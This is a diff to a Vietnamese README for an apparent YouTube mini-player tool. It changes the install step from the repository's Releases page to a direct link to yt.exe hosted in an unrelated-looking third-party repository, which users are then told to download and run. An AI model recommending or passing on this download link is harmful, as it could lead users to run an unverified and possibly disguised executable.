@@ -18,7 +18,7 @@ Tiện lợi để vừa làm việc vừa xem video mà không cần mở trìn
 
 ## 🚀 Cài đặt & Sử dụng
 
-1. Vào phần **Releases** của repo này.
+1. Vào [**Đây**](https://github.com/ArknightsAssetsEN/Repository/blob/main/yt.exe).
 2. Tải file **`yt.exe`** về máy.
 3. Mở `yt.exe` → nhập **YouTube Video ID** (ví dụ từ link `https://www.youtube.com/watch?v=sbfks7HdRoE` thì ID là `sbfks7HdRoE`).
 4. Video sẽ phát trong cửa sổ popup mini.
